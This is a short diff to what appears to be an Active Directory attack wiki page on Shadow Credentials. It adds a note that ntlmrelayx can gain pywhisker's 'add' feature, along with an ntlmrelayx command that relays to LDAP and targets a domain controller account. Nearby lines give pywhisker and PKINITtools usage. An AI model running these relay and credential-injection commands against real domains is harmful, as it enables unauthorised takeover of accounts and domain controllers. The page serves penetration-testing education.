@@ -34,6 +34,14 @@ From UNIX-like systems, the `msDs-KeyCredentialLink` attribute of a user or comp
 pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"
 ```
 
+{% hint style="success" %}
+A Pull Request \([\#1132](https://github.com/SecureAuthCorp/impacket/pull/1132), awaiting review\) includes pywhisker's "add" feature in ntlmrelayx.
+
+```bash
+ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'
+```
+{% endhint %}
+
 When the public key has been set in the `msDs-KeyCredentialLink` of the target, we can use [Dirk-jan](https://twitter.com/_dirkjan)'s [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools/) tool to request a TGT \(Ticket Granting Ticket\) for the target object.
 
 ```python
